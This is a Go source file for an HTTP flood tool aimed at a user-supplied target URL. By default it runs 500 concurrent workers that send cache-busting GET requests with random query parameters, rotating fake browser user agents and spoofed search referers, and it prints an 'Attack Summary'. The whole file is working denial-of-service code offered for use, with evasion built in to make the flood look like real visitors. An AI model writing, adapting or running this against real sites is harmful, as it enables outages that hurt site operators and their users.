package main

import (
    "crypto/tls"
    "flag"
    "fmt"
    "io"
    "math/rand"
    "net/http"
    "os"
    "os/signal"
    "strings"
    "sync/atomic"
    "syscall"
    "time"
)

var (
    targetURL    string
    concurrency  int
    duration     time.Duration
    reqSuccess   uint64
    reqFailed    uint64
    stopFlag     int32
    client       *http.Client
    userAgents   []string
)

func init() {
    userAgents = []string{
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/118.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/118.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    }
}

func buildTransport() *http.Transport {
    return &http.Transport{
        MaxIdleConns:        1000,
        MaxIdleConnsPerHost: 1000,
        MaxConnsPerHost:     0,
        IdleConnTimeout:     90 * time.Second,
        DisableCompression:  true,
        TLSClientConfig: &tls.Config{
            InsecureSkipVerify: true,
        },
    }
}

func randomString(n int) string {
    const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    b := make([]byte, n)
    for i := range b {
        b[i] = letters[rand.Intn(len(letters))]
    }
    return string(b)
}

func worker() {
    // Pre-allocate URL builder buffer mental
    baseURL := targetURL
    joiner := "?"
    if strings.ContainsRune(targetURL, '?') {
        joiner = "&"
    }

    for atomic.LoadInt32(&stopFlag) == 0 {
        // Generate random parameter
        param := randomString(rand.Intn(6) + 4)
        value := randomString(rand.Intn(8) + 4)
        fullURL := baseURL + joiner + param + "=" + value

        req, err := http.NewRequest("GET", fullURL, nil)
        if err != nil {
            atomic.AddUint64(&reqFailed, 1)
            continue
        }

        req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
        req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
        req.Header.Set("Accept-Language", "en-US,en;q=0.5")
        req.Header.Set("Accept-Encoding", "gzip, deflate, br")
        req.Header.Set("Cache-Control", "no-cache")
        req.Header.Set("Pragma", "no-cache")
        req.Header.Set("Connection", "keep-alive")
        req.Header.Set("Upgrade-Insecure-Requests", "1")

        // Add random referer occasionally
        if rand.Intn(2) == 0 {
            req.Header.Set("Referer", "https://www.google.com/search?q="+randomString(5))
        }

        resp, err := client.Do(req)
        if err != nil {
            atomic.AddUint64(&reqFailed, 1)
            continue
        }

        // Drain and close body to reuse connection
        io.Copy(io.Discard, resp.Body)
        resp.Body.Close()
        atomic.AddUint64(&reqSuccess, 1)
    }
}

func main() {
    flag.StringVar(&targetURL, "url", "", "Target URL (e.g., https://example.com)")
    flag.IntVar(&concurrency, "c", 500, "Number of concurrent workers")
    flag.DurationVar(&duration, "d", 60*time.Second, "Duration of attack (e.g., 30s, 1m)")
    flag.Parse()

    if targetURL == "" {
        fmt.Println("Error: Target URL required")
        flag.Usage()
        os.Exit(1)
    }

    if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "http://") {
        targetURL = "https://" + targetURL
    }

    rand.Seed(time.Now().UnixNano())

    client = &http.Client{
        Transport: buildTransport(),
        Timeout:   5 * time.Second,
    }

    fmt.Printf("Starting flood on %s with %d workers for %v\n", targetURL, concurrency, duration)
    fmt.Println("Press Ctrl+C to stop early.")

    stopChan := make(chan os.Signal, 1)
    signal.Notify(stopChan, os.Interrupt, syscall.SIGTERM)

    // Launch workers
    for i := 0; i < concurrency; i++ {
        go worker()
    }

    start := time.Now()
    select {
    case <-time.After(duration):
        atomic.StoreInt32(&stopFlag, 1)
    case <-stopChan:
        atomic.StoreInt32(&stopFlag, 1)
        fmt.Println("\nInterrupted early")
    }

    elapsed := time.Since(start)
    success := atomic.LoadUint64(&reqSuccess)
    failed := atomic.LoadUint64(&reqFailed)
    total := success + failed

    fmt.Printf("\n=== Attack Summary ===\n")
    fmt.Printf("Duration: %v\n", elapsed)
    fmt.Printf("Total Requests: %d\n", total)
    fmt.Printf("Success: %d\n", success)
    fmt.Printf("Failed: %d\n", failed)
    if elapsed.Seconds() > 0 {
        fmt.Printf("Rate: %.2f req/s\n", float64(total)/elapsed.Seconds())
    }
}